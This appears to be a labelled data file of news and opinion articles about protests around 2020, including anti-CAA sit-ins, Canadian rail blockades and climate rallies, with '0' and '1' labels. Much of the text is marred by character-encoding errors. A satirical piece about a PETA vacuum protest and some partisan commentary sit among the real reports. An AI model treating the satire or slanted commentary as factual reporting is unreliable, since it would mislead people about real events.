out-influencing the Iraqi Army’s 8th Division, which is technically al-Qaim-based,” Lister said. Following the Dec. 27 rocket attack against Kirkuk, American warplanes launched retaliatory strikes hitting a Kataib Hezbollah headquarters located in al-Qaim. The airstrikes sparked an escalation that led to a standoff at the U.S. embassy in Baghdad, a decapitation strike against Quds Force commander Qassem Soleimani, and a ballistic missile strike by Iran targeting coalition troops housed at two Iraqi bases. U.S. Central Command has struggled to protect and respond to the rocket attacks that continue unabated despite numerous threats from U.S. officials towards Tehran and its proxies. The coalition has come under criticism for not fielding counter rocket, artillery, and mortar, or C-RAM systems at Iraqi bases, especially Camp Taji, which has been the target of multiple rocket attacks. C-RAM systems can be used to defend bases from indirect fire and mortars, but Marine Gen. Kenneth McKenzie Jr., the CENTCOM commander, explained they’re often used to bolster the defense of Patriot systems. Patriot missile batteries are moving into Iraq to help counter a potential Iran ballistic missile strike. Camp Taji, the Iraqi base hit by 18 rockets on March 11, did not have a C-RAM system. McKenzie told reporters that CENTCOM has to “ruthlessly prioritize” where it places defensive equipment because there are more troops than systems and assets available to protect everyone. McKenzie said it was an “unpleasant fact” but the U.S. “can’t have C-RAM everywhere.” The CENTCOM commander also noted that the C-RAM is “not a panacea.” On March 13, McKenzie said the threat from Iran “remains very high” following the latest rocket attack against coalition forces involving an Iran-backed Shia militia. OIR said coalition troops would leave al-Qaim in the coming days following the transfer of equipment to Iraqi forces. OIR detailed in a release it was handing over roughly $900,000 worth of equipment to Iraqi forces that includes container housing units, water tanks, generators, tents and barriers. The coalition said it will continue to consolidate forces from smaller bases across Iraq throughout 2020. Shawn Snow is the senior reporter for Marine Corps Times and a Marine Corps veteran.

Family said Reggie Relf was the life of the party. The engineer had been looking after his elderly mother when in late March, he started feeling ill. “He said, ‘Ami I got this cold I can’t beat’, said sister Ami Relf. “He thought it was a cold and he had been coughing.” His sister eventually got him to go to an immediate care clinic in the western suburbs on March 29. Family said he was sent home because he did not have a fever. Relf did say he would get hot at night. Relf continued to isolate himself in his mother’s basement and would communicate by texting. “He had stopped texting,” Ami Relf said. “My brother had brought him some food and left it at the step, and he did get that, but on April 6, my other brother Randy went into the basement and found him dead.” Paramedics believe he died two days earlier. The family later got confirmation from the medical examiner that Relf died of COVID-19. “They sent him home to die,” Relf said. Relf said she is speaking out because she wants to highlight the health disparities within the African American community. “With him having diabetes, that immediate care should have sent him to the emergency room, checked him in, something should have happened, he had all the symptoms,” Relf said. Health care disparities in the African American community have been a decades-long issue that’s once again taking center stage because of the virus. “Generations of systemic disadvantages in healthcare delivery and in healthcare access in communities of color and black communities in particular are now amplified in this crisis,” Gov. Pritzker said Saturday. State officials said mortality rates in African Americans are five times higher than whites. Relf said as of now, her family is not considering legal action, but she plans to use her 21 years experience being a teacher to educate people about inequality. “It’s the saying, if white people caught a cold, black people catch pneumonia. I saw that,” Relf said. Submit Δdocument.getElementById( ""ak_js_1"" ).setAttribute( ""value"", ( new Date() ).getTime() ); Copyright 2022 Nexstar Media Inc. All rights reserved.

0,"“This judgment is unsettling, deeply so. But as long as I am alive, I will fight for justice,"" Kausalya said. Sankar and Kausalya. Chennai: Kausalya remembers March 13, 2016 like it happened yesterday. “Sankar had a college function the next day and we wanted to buy him a new shirt. All his shirts were old and faded. I had in a mind a peach shirt for him that I had once spotted in a shop. For three months, I was thinking of buying it for him.” Kausalya, who was earning a salary at the time, and Sankar, a final year mechanical engineering student, went to a shop at Udumalaipettai to pick up the shirt. “We did and came back home, but both of us liked a turquoise green shirt that was on display at the shop.” So, the couple decided to go to the shop again. “After exchanging the shirt, we had Rs 60 left and Sankar insisted I have my favourite chilli parotta in that.” But considering that the money wasn’t enough, they decided instead on kambu koozh (a millet-based porridge) and were waiting to cross the road after eating the koozh at a street shop in front of a cinema theatre. Kausalya distinctly remembers people coming out of the theatre “after the show was over”. None of that deterred the murderous group that would soon descend on scene. Kausalya, from a caste Hindu community, was hit first on the head. As she lay in a pool of blood, she saw them hack to death her husband Sankar, a Dalit. She remembers the shirt, soaked in blood. On June 22, 2020, the blood stain remains fresh in her memory, the image of it renewed by the Madras high court’s judgement in the case. The court acquitted Chinnasamy, Kausalya’s father and the main accused in the case who was sentenced to death by a principal court in Tiruppur. “This is not the kind of judgement I expected,” she says, her voice choking over phone. A Madras high court bench comprising Justices M. Sathyanarayanan and M. Nirmal Kumar also commuted the death sentences of five others to life sentence of 25 years. Also read: As Symbols of Discrimination Fall Worldwide, Meet the Women Who Blackened Manu’s Statue Earlier, in December 2017, the Tiruppur principal court had sentenced Chinnasamy to death while acquitting Annalakshmi, Kausalya’s mother. The court had also handed death sentences to five other convicts, a double life term to one and five years of rigorous imprisonment to another. Two others, apart from Annalakshmi, were acquitted. Besides upholding the acquittal, the high court also set aside the conviction of two others. According to a report in The News Minute, Chinnasamy’s lawyer had stated that the prosecution “did not prove the conspiracy between Chinnasamy and the gang”. He claimed that the video recording could have been morphed. “If the video of Sankar’s killing was morphed, how about mine? I was also attacked; I was also almost killed. Is it also a lie?” Kausalya says. “I am here as an eyewitness; it is sad that I was never briefed of the case after it went to the Madras high court.” Kausalya also wonders why the court should finish the case in a hurry, while the state is still reeling under the coronavirus pandemic. A. Kathir, executive director of Evidence – an organisation working on caste-related crimes – says they will soon approach the Supreme Court with an appeal. “We are already in touch with some lawyers. If CCTV footage was morphed and could lead to the acquittal of the main conspirator, how were others sentenced to life?” he asks. Kathir says the judgment delivered by the Tiruppur principal court was a landmark judgment and had served as a role model. “There were only three such judgements on caste-motivated murders, of which Sankar’s was the first. This judgement by the Madras high court is undoing all that. It is not just a judgment, it will set a precedent, exert influence on future cases that come up. How can we even expect justice in the future?” Also read: Maharashtra: Two Dalit Men Killed in Separate Incidents, Police ‘Acted Late’ Thol Thirumavalavan, Lok Sabha MP and founder leader of Viduthalai Chiruthaigal Katchi, agrees. “This judgement would encourage caste-motivated murders and mercenary killings. It’s deeply painful. The government lawyer failed to put forth valid arguments, also the lack of a separate law for caste-motivated murders could be a reason for the judgment. The state and the Central governments should pass a law immediately against caste-motivated murders.” Kathir points out that the guidelines laid down by the Supreme Court in 2018 were not followed in this case. “The image that the courts upheld justice in caste-motivated murders stands shattered today.” Kausalya has been left feeling shattered. Pointing out the irony of others involved in the conspiracy being punished while her parents were acquitted, she asks: “Except for Chinnasamy and Annalakshmi, what do they (the convicted killers) have to do with me?” But she is not the one to give up hope. “This judgment is unsettling, deeply so. But as long as I am alive, I will fight for justice. I will live to see justice for Sankar. I am still hopeful.”"

The legendary figure sat in a hunger strike and broke his fast by drinking coconut water. Pictures and videos of Doreswamy taking part in the protests has spread like wildfire over the internet. Social media users hailed Doreswamyâ€™s resilience as he battled a myriad of old age issues to stand with the protestors at the ripe old age of 101 Doreswamy was notorious during Indiaâ€™s freedom struggle for making bombs to fight the British oppressors. But he soon abandoned his violent ideals to adopt the Gandhian philosophy of nonviolence. Doreswamy continues to be a committed social worker and turned 100 in April 2018. As anti-CAA protests continue to grip the nation, the one in Bengaluru took place at Freedom Park.

A feminist collective performed a Bengali version of the Chilean feminist performance piece, â€œThe Rapist is Youâ€ in Kolkata on Saturday as part of the widespread protests against Narendra Modiâ€™s visit to the city. Titled Un violador en tu camino in Spanish, it was composed by a Chilean feminist collective and performed in Santiago in 2019, against the backdrop of widespread anti-government protests. Since then, the song has gone viral, inspiring women around the world to generate their own versions. In Kolkata, it was translated into Bengali and named Dhorshok Tumii. A group of women connected over social media decided to perform it. After a fortnight of rehearsals, mostly in Jadavpur University, the collective performed it for the first time on January 4, outside the cityâ€™s iconic New Market. When it was learnt that Modi was going to come to Kolkata, the collective decided to repeat their performance. â€œWe wanted to highlight the patriarchal violence that Modiâ€™s idea of a Hindu Rashtra represents,â€ said Aopala Banerjee, one of the women who had performed the anthem on Saturday told Scroll.in. The chant was also heard at a flash mob of women outside the courthouse where Harvey Weinstein is going to be tried for sexual abuse.

This week, Fonda found herself marching on Capitol Hill next to recent Golden Globe winner Joaquin Phoenix, who Fonda claims that she didnâ€™t personally invite but â€œcame of his own volition!â€ He recently (and shambolically) praised the HFPA for offering vegan cuisine at their fancy ceremony. In the process, he also asked his fellow actors to stop taking private jets to film festivals, and he made his points again in D.C. on Friday. â€œI struggle so much with what I can do [to fight climate change] at times,â€ he said in this video tweeted by The Hill. â€œThere are things that I canâ€™t avoid â€” I flew a plane out here today, or last night rather. But one thing that I can do is change my eating habits.â€ Joaquin Phoenix: ""I struggle so much with what I can do [to combat climate change] at times.

1,"Eighty-six sentenced for violent protests after 2018 acquittal of a Christian woman in blasphemy case. Islamabad, Pakistan â€“ A Pakistani court has sentenced 86 members of a far right religious party to 55-year prison terms each for taking part in violent protests against the acquittal of a Christian woman in a blasphemy case, party officials say. The verdicts were announced late on Thursday night by a court in the northern garrison city of Rawalpindi, Pir Ejaz Ashrafi, a senior leader of the Tehreek-e-Labbaik Ya Rasool Allah (TLYRA) party, told Al Jazeera. The 86 TLRYA activists were arrested in November 2018, as the party led violent protests against the acquittal by the countryâ€™s Supreme Court of Aasia Bibi, a Christian woman who was on death row for having allegedly committed blasphemy in 2009. Days of protests saw TLRYA activists â€“ led by party leader Khadim Hussain Rizvi â€“ block big highways and destroy public property across the country, but mostly centred in the central province of Punjab. At the time, senior TLP leader Pir Afzal Qadri had called for the judges who announced the acquittal to be killed. The charges against those sentenced include destroying public property, attacking passers-by and disrupting citizensâ€™ everyday life. Ashrafi said the sentences were â€œharshâ€ and that his party would be appealing the decision at the high court. â€œThis is the murder of justice. We are hopeful that they will suspend the verdict in the high court, and our legal team is working on it,â€ he told Al Jazeera by telephone from the eastern city of Lahore, where the TLYRA is based. Bibi, a Christian woman from the central Pakistani village of Ithan Wali, was accused by two Muslim women of having committed blasphemy by insulting Islamâ€™s Prophet Muhammad during an argument over a drinking water vessel in 2009. She spent eight years on death row, with rights groups arguing that there were numerous fair trial concerns in her case, as are commonly reported in most blasphemy prosecutions in Pakistan. In 2018, the Supreme Court acquitted Bibi, ruling that prosecution witnesses had lied to implicate her. In May, she flew to Canada where she was forced to seek asylum to guarantee her and her familyâ€™s safety after the verdict. Blasphemy against Islam is a sensitive subject in Pakistan, where the crime can carry a mandatory death sentence. Increasingly, accusations have led to violent attacks by mobs or assailants, with at least 75 people killed in such attacks since 1990, according to an Al Jazeera tally. Two of those killed â€“ a sitting federal minister and a serving provincial governor â€“ were attacked for having supported Bibi during her trial. Last month, a court in the central city of Multan sentenced university lecturer Junaid Hafeez to death for blasphemy after a six-year trial. Hafeez has spent most of his incarceration in solitary confinement due to threats against his life, his lawyer says. One of his lawyers, Rashid Rehman, was murdered in 2014 for defending him. The TLYRA has publicly endorsed violence in the name of the blasphemy laws, with a regular chant at protests such as the November demonstrations for which the activists were sentenced on Thursday calling for all blasphemers to be beheaded. Rizvi, the TLYRA chief, is currently out on medical bail as he faces charges of inciting hatred and violence at the rallies. His brother, Ameer Hussain Rizvi, and nephew are among those who were sentenced on Thursday, Ashrafi said. Asad Hashim is Al Jazeeraâ€™s digital correspondent in Pakistan. He tweets @AsadHashim.

1," Sections TV Featured More from NBC Follow NBC News TEHRAN â€” Iranâ€™s judiciary said Tuesday that it had arrested an undisclosed number of suspects involved in the accidental downing of a Ukrainian passenger plane that killed all 176 aboard last week. The announcement came after days of protests shook Iran, with demonstrators railing against the governmentâ€™s initial attempts to deny involvement in the downing of the plane. Thirty people were arrested during the demonstrations, a judicial spokesperson, Gholamhossein Esmaili, said at a news conference Tuesday. Esmaili gave no further details on the number of those arrested in connection with the downing of the passenger jet and did not reveal their names or professions. He also said that the planeâ€™s black box had been taken to France for the data to be read and that more information would be released. But Franceâ€™s bureau of aviation investigation confirmed to NBC News on Tuesday that no black boxes had been sent to France and nor were they expected to be. Canada's transportation safety board had said Monday that the black boxes were damaged and remained in Iran. ""We haven't seen the extent of the damage, but extracting the data will pose some technical challenges for the Iranian investigating team,"" the head of the board said. Iran initially denied allegations that a missile had struck the plane shortly after it took off last Wednesday from Tehran, the capital, only to reverse course on Saturday and admit that it had shot down the jet by mistake. Download the NBC News app for breaking news and politics Iranian President Hassan Rouhani on Twitter Saturday blamed â€œhuman errorâ€ for the â€œhorrific crash.â€ Over the weekend, the U-turn prompted Iranian protesters to take to the streets demanding that Supreme Leader Ayatollah Ali Khamenei step down. Rouhani said that one person could not be held responsible for the downing of the plane and called for a special court to investigate. Aniseh Bassiri Tabrizi, a research fellow at the Royal United Services Institute, a London think tank, said the way in which the government and the establishment handle the broader repercussions of the incident could be a ""watershed moment for Iran."" ""The choices it makes are likely to reverberate throughout Iranian politics and society for months, or even years, to come,"" she wrote in an analysis piece for the BBC. Britain, France and Germany said Tuesday that they were triggering a dispute mechanism that is part of the nuclear deal with Iran, citing its failure to live up to terms of the pact. The foreign ministers of the three nations said in a statement that they were ""left with no choice, given Iran's actions, but to register today our concerns that Iran is not meeting its commitments."" But, they added, their countries would not join a campaign to implement maximum pressure against Iran and hoped that parties to the nuclear accord would find a way forward to resolve the impasse and preserve the agreement. The 2015 nuclear deal between Iran and world powers eased international sanctions on Tehran in return for limits on its nuclear program. President Donald Trump withdrew the United States from the agreement in May 2018 and imposed economic sanctions on the country's oil industry, as well as banking and other key sectors.

1,"More than 1,500 women have joined the sit-in protest against the CAA at Delhiâ€™s Khureji Khas. Itâ€™s a gloomy afternoon. The absence of the sun can be felt as the frigid air stings our cheeks. Undeterred by the biting cold, hundreds of women have been gathering at Khureji Khas since 18 January to register their dissent against the Citizenship (Amendment) Act and the National Register of Citizens (NRC). Chants of â€œhum ek haiâ€ (we are one) linger in the bamboo tent, which is decorated with posters and national flags. While Shaheen Bagh has become the epicentre of anti-CAA and anti-NRC protests, a similar sentiment has been echoing among women at Khureji Khas. The movement, which started as a small awareness campaign seeking to put an end to the misinformation, has now grown into a key anti-CAA protest site. Around 1,500 women have been participating at this peaceful gathering on all the days. One of them is 28-year-old Mehnaaz Sheikh, who recently quit her job. Mehnaaz, a resident of Khureji, was an English teacher at a private school. On being asked about her familyâ€™s reaction over her decision, she replies, â€œEven though my family is financially stable, I have always wanted to be independent. This is a sacrifice I made for my country,â€ she adds. While sharing her experience, Mehnaaz is offered tea by a girl. Braving the winter cold, she holds the paper cup between her palms to absorb its warmth. Just like Mehnaaz, 32-year-old Sadaf, who was working as a receptionist in a private firm, put down her papers. She had to convince her family to let her work in the first place, but after seeing the dadis of Shaheen Bagh, she too decided to quit. Sadaf has been participating in protests across the city ever since. â€œI stay at these protests all night. I barely know people in my locality, but these women have now become a part of my family,â€ she says. Thirty-year-old Nazia is another woman who decided to leave her job to participate in the protests. Like Mehnaaz and Sadaf, she too says that quitting her job was a sacrifice she made for her country. â€œFor me, the world revolved around work and home, but for these protests, I have been staying out till 5 am. In these 30 days I have seen parts of Delhi I had never heard of.â€ There is hardly any place to walk inside the tent. There is a makeshift stage where women wait for their turn to address the crowd. Everyone greets each other with hugs and broad smiles. For a lot of these women, convincing their families to let them work had been a difficult task.While there are many male relatives at the protest site, these women do not fear defying gender roles for a larger cause. They juggle between participating in protests and completing household duties, no matter how sleep deprived they feel. Naima, a homemaker, rocks her sleeping baby in her arms. She says she wishes to give her child a future where his loyalty towards the country will not be questioned. As she participates in the protest for 12 hours, her household duties, she says, have taken a backseat. Several attempts have been made to malign and discredit the protest at Khureji Khas with rumours doing rounds that the women were paid to protest. Shama, a middle-aged woman, dismisses these allegations. â€œI have everything, why would I come here for money,â€ she asks. Overhearing our conversation, a woman from the back shouts, â€œIâ€™ll give them Rs 2,000 if they (ministers) are willing to come here and hear our ordeal!â€ She recounts news from her hometown in Muzzafarnagar and tears up. Khurejiâ€™s women have faced criticism with many saying that the protests have resulted in traffic jams and caused disruption of movement. To shield protests at Khureji, committees were formed to ensure the smooth functioning of the demonstrations. â€œWe have legal, medical, traffic, security and stage committees,â€ says Amaantullah, a student of Jamia Millia Islamia. As we exit the tent, chants of â€˜Azaadiâ€™ resonate in the air, reminding us of an India that is led by its women.

1,"CN Rail and Via Rail are shutting down huge sections of their railway networks as Indigenous blockades continue to cripple the country's transportation systems. Via Rail is temporarily ending most passenger services nationwide, expanding an earlier work stoppage that restricted train cancellations to the Toronto-Ottawa-Montreal corridor. ""Via Rail has no other option but to cancel all of its services on the network, with the exception of Sudbury-White River (CP Rail) and Churchill-The Pas (Hudson Bay Railway), until further notice,"" the rail operator said in a media statement. The company said it would automatically process full refunds for all cancelled trips. ""You do not need to contact Via Rail to confirm the refund, but note that due to the volume of transactions it may take up to 15 days to receive,"" the Crown corporation said. ""We understand the impact this unfortunate situation has on our passengers and regret the significant inconvenience this is causing to their travel."" CN Rail, the country's largest railway, is ""initiating a progressive and orderly shutdown of its Eastern Canadian network"" because Tyendinaga Mohawk protesters near Belleville, Ont. have so far refused to dismantle their blockade. The railway operator said the shutdown, which will affect the entire network east of Toronto, may result in temporary layoffs of CN workers. Teamsters Canada, the union which represents over 16,000 workers in the rail industry, said Friday the shutdown could lead to roughly 6,000 layoffs. Via Rail trains run on CN tracks in most parts of the country, a vestige of a time when CN ran its own passenger trains. ""With over 400 trains cancelled during the last week and new protests that emerged at strategic locations on our mainline, we have decided that a progressive shutdown of our Eastern Canadian operations is the responsible approach to take for the safety of our employees and the protestors,"" J.J. Ruest, the president and CEO of CN, said in a media statement. ""This situation is regrettable ... these protests are unrelated to CN's activities and beyond our control. Our shutdown will be progressive and methodical to ensure that we are well set up for recovery, which will come when the illegal blockades end completely."" Last weekend, CN Rail obtained a court injunction to end the illegal Mohawk demonstration. The injunction has been ignored by the protesters. Activists also ignored a request from the on-reserve Tyendinaga Police for them to voluntarily dismantle the blockade. The injunction forbids any continued interference with the rail line under the threat of arrest. The Ontario Provincial Police has not yet enforced the injunction. The federal government, which has jurisdictional authority over railways, has so far refused to intervene. Indigenous Services Minister Marc Miller has agreed to meet with the Mohawks on Saturday. Transport Minister Marc Garneau said he plans to meet with his provincial and territorial counterparts Friday, adding he is in contact with CN and CP. In a statement Thursday, Garneau said ""freedom of expression"" is an important democratic right, but added, ""these activities must respect the court decisions and the law."" The Mohawk activists have said they won't end their demonstration until the RCMP leaves the traditional territory of the Wet'suwet'en in northern B.C. Wet'suwet'en hereditary leaders had been blocking road access to a construction site for the Coastal GasLink pipeline, a key part of a $40-billion LNG Canada liquefied natural gas export project. While much of the police action near that road ended Tuesday with multiple arrests, the RCMP still has officers stationed near the pipeline construction site. A separate rail blockade on CN tracks near New Hazelton, B.C. was set to end today after Gitxsan hereditary chiefs agreed to end protests designed to show solidarity with the Wet'suwet'en. Crown-Indigenous Relations Minister Carolyn Bennett and her provincial counterpart will hold talks with both the Gitxsan and the Wet'suwet'en hereditary chiefs in the coming days. A prolonged shutdown could have devastating consequences for the country's economy. CN moves more than $250 billion a year in goods across its transcontinental network. The shutdown threatens the transport of food and consumer items, grain, de-icing fluid for airports, construction materials, propane supplies for Quebec and Atlantic Canada, and natural resources like lumber, aluminum and coal, the railway said. The Canadian Chamber of Commerce urged the federal and provincial governments and the police to immediately end the transport chaos and help CN restore rail service. ""From propane to grain and food and consumer items, Canada's supply chains are being severely damaged by the continuing interruptions to Canada's rail services by protestors,"" the organization said in a statement. ""The rail system affects the entire Canadian economy and Canadians everywhere, including people trying to get to and from work. They must be allowed to continue to serve the thousands of businesses that depend on them."" Bob Masterson, president and CEO of the Chemistry Industry Association of Canada, said this shutdown could be hugely problematic. ""It's a critical situation. It's an extremely dire situation for the economy and, in the coming days, for communities across the country,"" he told CBC's Power & Politics. He said 80 per cent of his industry's products, such as jet fuel for planes and chlorine for drinking water, are shipped by rail. Masterson said the provincial police need to enforce the court-ordered injunction and clear out the Mohawk protesters. ""Everyone has the right to protest ... but the courts have said, 'You've gone too far, it's no longer in the public interest,'"" he said. ""The actions are illegal, this is trespassing.

1,"It is noteworthy to mention that Shaheen Bagh comes under Okhla constituency where controversial Aam Aadmi Party member Amanatullah Khan has registered a victory. As the Delhi assembly elections draw to an end, Shaheen Bagh protesters seem to have vacated the protest site that they had occupied for almost 2 months now, blocking one of the busiest thoroughfares of the national capital in opposition to the enactment of the Citizenship Amendment Act that intends to grant citizenship to persecuted minorities from Pakistan, Afghanistan and Bangladesh. On Tuesday morning, incidentally, when the Delhi Assembly election results were to be announced, the protest site of Shaheen Bagh appeared empty with scarce number of demonstrators at the site, says a report published in Amar Ujala. In the run up to the Delhi elections, there were speculations galore that the protest that had continued for more than 55 days, causing grave inconvenience to the lakhs of daily commuters will vanish just after the elections concluded. The speculations now appear to have turned true as a large number of regular protesters at Shaheen Bagh have deserted the protest site on Tuesday morning and did not turn up for what they claimed their democratic right to protest against the governmentâ€™s move to bring in the CAA. Since December 15, 2019, protesters gathered at Shaheen Bagh and blocked one of the arterial roads in Delhi against the Citizenship Amendment Act. The protest site was accused of being an independent enclave where participation of people was regulated based on their political inclinations and past predispositions. It also witnessed anti-India and pro-Azaadi slogans being chanted by the demonstrators. It is noteworthy to mention that Shaheen Bagh comes under Okhla constituency where controversial Aam Aadmi Party member Amanatullah Khan has registered a victory. The Aam Admi Party is well poised to secure a thumping majority in the 70-seats Delhi assembly to stake a claim at the government while the BJP is expected to win 15-20 seats. The Congress party, on the other hand, seems to be on its way to acquire another duck. Whether NDTV or 'The Wire', they never have to worry about funds.

1,"GLENWILLOW, OHâ€”In what is believed to be the largest anti-animal-cruelty rally targeting a household appliance maker, thousands of angry PETA activists descended on Hoover headquarters Wednesday to protest a model of vacuum cleaner that reportedly spooked a dog. â€œAnimal lives are equal to human lives, and a vacuum startling any dogâ€”particularly such a good boy as Rufflesâ€”is nothing short of terrorism,â€ said protest organizer Rebecca Watts, who brandished a dust-filled vacuum bag she intended to pour on an unwitting Hoover executive. â€œRuffles was underneath the kitchen table for several hours while the Hoover corporation said nothing. And that is nothing newâ€”hundreds of dogs are spooked by vacuums on a daily basis, and society refuses to offer so much as a â€˜there, there.â€™ Some repulsive pet owners even go so far as to post videos of their dogs getting spooked by vacuums as if life-threatening trauma is funny.

1,"Spencer Fernando Opinion & Insight Amid pathetic weakness by the Trudeau Liberals, we are already seeing more protests. First, the Thousand Islands Bridge to the U.S. was temporarily blocked, with authorities telling people to find an alternative route rather than clearing out the blockage.

But as I noted above, a border crossing was already temporarily shut down â€“ which is clearly an illegal act. This is no surprise. Weakness invites further challenge, and by refusing to enforce the laws, the Trudeau Liberals have shown immense weakness. Lawbreakers, radical blockaders, have been given reign over our railways, shutting them down with impunity and without consequence. As a result, more and more radicals will be emboldened to violate the law, and the biggest victims of all this will be the hard-working law-abiding Canadian taxpayers who pay the bills for this country.

1,"Jane Fonda had a scheduling problem, the collision of two important parts of a very busy life. The Oscar-winning actor had moved from Century City to Washington, D.C., in September, intent on a mission: to raise awareness of climate change. She protested on the U.S. Capitol grounds in a bright red coat â€” purchased on sale at Neiman Marcus â€” was arrested five times, spent a night in jail with a herd of scurrying cockroaches. But she was under contract for the seventh and final season of her comedy series, â€œGrace and Frankie.â€ Being half of the title, she couldnâ€™t just bail. She asked for a hiatus in filming. Ted Sarandos, chief content officer at Netflix, â€œlooked at me like I was crazy,â€ she said. â€œHeâ€™s a good guy, but heâ€™d already signed all the contracts.â€ Her four months of weekly protests in the nationâ€™s capital, called Fire Drill Fridays, came to an end in January. But they â€œhad been transformative,â€ the 82-year-old told 150 or so mostly millennials Saturday afternoon in West Hollywood. â€œAnd when the time was coming to an end, I started to get real depressed. Iâ€™m going to have to leave and go back to business as usual.â€ Which is how the California version of Fire Drill Fridays was born. Starting Feb. 7, Fonda will kick off a series of monthly Golden State protests with a rally on the steps of Los Angeles City Hall. There will be celebrities â€” Norman Lear and Rita Moreno, among others â€” speeches, a march and a little civil disobedience at a venue to be named later. Future events are planned for Wilmington, Bakersfield and other cities. Washington had the White House as backdrop, legislators to persuade and a ready army of television cameras. But California is strategic, she told members of The Wing, a womenâ€™s co-working space. Lots of oil extraction, lots of fossil fuel consumption, a reputation as a national environmental leader and a reality that could use some help. â€œIâ€™m really happy that weâ€™re here,â€ said Fonda, urgent and intense. â€œThis is the place we can really emphasize stopping the drilling and the fracking.â€ She said she wants Gov. Gavin Newsom to put an end to new oil-drilling permits in the state. She paused. Smiled. And continued in a conspiratorial whisper: â€œWeâ€™re meeting with him, by the way, next Thursday.â€ The womenâ€™s laughter drowned her out. â€œOil rules in California. Itâ€™s very hard for politicians to stand up to Big Oil. But thatâ€™s where leaders come from.â€ Fonda has spent most of her adult life juggling two full-time careers: as an actor with dozens of movies, documentaries and television shows under her very small belt; and as an activist, supporting womenâ€™s rights, the antiwar movement, the United Farm Workers, the Black Panthers, Native American rights, reproductive rights and the environment, among other causes. Climate change, she said in an interview after the West Hollywood event, â€œbrings it all together. .... It may look like, in my life and my history as an activist, there have been a lot of different things, [but] theyâ€™re all connected.â€ Fonda said sheâ€™s been supporting indigenous rights in tribal country since 1970. Today, she said, much of that same land contains â€œso much fossil fuel, so much of the materials that the oil companies want to extract, that they are front-line communities now in the war against fossil fuel.â€ Annie Leonard is executive director of Greenpeace USA, which is part of the Fire Drill Friday effort. She said Fonda has â€œa phenomenal ability to draw new people into the movement, especially women over 50. She did [the Washington protests] for 14 weeks. ... Hundreds and hundreds of people came.â€ Fonda said she sees herself and other celebrities as â€œrepeaters,â€ the antennae on the tops of mountains that pick up communication signals and transmit them to wider audiences. â€œI donâ€™t do the science,â€ she said. â€œI donâ€™t do the research. Iâ€™m not the wonk. But I can pick up the signals of the people in Wilmington or the scientists in their labs and expand their voices. Thatâ€™s what I think the role of someone like me is.â€ Among her biggest regrets, Fonda has said repeatedly through the years, was posing on an anti-aircraft gun during a tour of North Vietnam in 1972, which earned her the nickname Hanoi Jane. She has been proudest, she said Saturday, of Fire Drill Fridays, which are the joy of her ninth decade. â€œTen thousand people have signed up to take it nationally,â€ she said. â€œI had no idea that this was going to happen. It was an instinct. I may be famous and white and privileged, but when I feel a need for something, I find thereâ€™s usually a whole lot of people who feel the same need. ... With Fire Drill Fridays, the rallies, the civil disobedience, the risking arrest, appealed to a whole lot of people.â€ In her daily life, Fonda says, she does her best to be environmentally minded. She bought a Prius when they first appeared and switched to an electric car last year. Meat once a month, fish, twice. No single-use plastics. The red coat she bought for the protest was the last piece of clothing she plans to purchase, she said, with the exception, perhaps, of some underwear and socks. When you see her at the Oscars on Feb. 9, sheâ€™ll be wearing a dress thatâ€™s a decade or so old, an Elie Saab number sheâ€™s already worn on the red carpet at Cannes. â€œI havenâ€™t changed sizes, and I have a closet full of clothes,â€ Fonda said. â€œI donâ€™t need anything. So If I donâ€™t need anything, Iâ€™m not going to get it.â€ But she wonâ€™t be getting arrested in Los Angeles on Friday. After five arrests in Washington, she was facing possible court dates 2,000 or so miles from the set of â€œGrace and Frankie,â€ community service equally far away. So her lawyer negotiated a deal: She can film in California if she does not engage in civil disobedience for 90 days. Which ends in April. At which time, she said, she plans to hold out her wrists for those zip-tie handcuffs yet again. â€œOf course,â€ she said. Of course.

1,"Salem, Ore. â€“ Oregonâ€™s timber workers are preparing for a convoy to the Capitol. Theyâ€™ll be coming from all over the state, driving to Salem first thing in the morning to protest the new Cap and Trade bill. The bill is aimed at reducing Oregonâ€™s carbon emissions, but loggers and other trade workers say the gas tax part of the bill will hit them especially hard. The group Timber Unity on Facebook has about 53,000 members. They believe Oregon can reduce carbon emissions without any new taxes. Theyâ€™ll present their own plan to do that today. KXLâ€™s Rosemary Reynolds is talking with truckers at the weigh station in North Plains and will have more on the story throughout the day. Check out these photos from Rosemary:  One couple on their way to Salem this morning is Dawn and her husband. Theyâ€™re longtime small business owners in East county and have never been politically active until now. Dawn tells KXLâ€™s Jacob Dean theyâ€™ll be volunteering, helping to setup in Salem later this morning. On the other side of the issue â€“ some Rural Oregonians strongly support the Cap and Trade bill. Meghan Kemple is the Director of the Oregon Climate and Agriculture Network. She says over 250 stake holders like farmers and ranchers from across Oregon have signed a letter in support of the proposal. She tells KXLâ€™s Mike Turner, significant changes have been made to the policy that will protect rural communities and address concerns. Like rising fuel costs will actually phase in over time. Meanwhile, a Republican lawmaker in Salem says Democrats are making another GOP walkout likely, because of amendments they added to a cap and trade bill. Senator Fred Girod tells the Statesman Journal the bill which would raise fuel prices to cap greenhouse gases, is even worse than the original, that led to a Republican walkout last year, which denied Democrats a vote on the bill.

1," Led Zeppelinâ€˜s Robert Plant has canceled an upcoming G! Festival appearance in protest of an annual whaling practice known as grindadrÃ¡p (the â€œGrindâ€). G! Festival, is a yearly event held at the seaside village of GÃ¸ta on the Danish archipelago of the Faroe Islands. Coinciding with the festival the Grind sees over a thousand pilot whales and dolphins driven to the shores of local beaches and slaughtered by island residents. While the Grind is a thousand-year-old tradition, the manner in which it is conducted is considered by animal rights activists as appallingly cruel. â€œWhen whalers locate the whale pods,â€ local RannvÃ¡ Johansen has shared of the event to BluePlanetSociety.org, â€œthey are driven ashore, [which can take] a very long time. The whales then get stressed and the entire whale family can see each other being killed and hear screaming from their babies. They can only wait for themselves to feel the knife.â€ Plant was set to perform at the festival on July 18th, However, G! Festival has now announced via its official website that the Led Zeppelin vocalist and new backing outfit Saving Grace will no longer appear after having the cull brought to their attention by environmental advocacy group Blue Planet Society. â€œWeâ€™re disappointed and annoyed with the cancelation,â€ G! Festivalâ€™s managing director SigvÃ¸r LaksÃ¡ has shared via the events official website, â€œWeâ€™ve been excited and happy with the massive interest and the positive reception to the announcement of Saving Grace, especially the Robert Plant fever that naturally comes with it.â€ â€œIt seems somewhat unprofessional for these acts to pull out of a booking without any prior notice or attempt at constructive dialogue which might have allowed us to address the artistâ€™s concerns,â€ LaksÃ¡ continues, â€œIt also appears contradictory when an artist is happy to play in countries like Norway and Iceland [which carry out commercial whaling], which Mr. Plant has done in the past, even in 2019.â€ â€œThis is a severe blow for the festival,â€ SigvÃ¸r concludes, â€œwhich forces us to rethink our approach in producing the 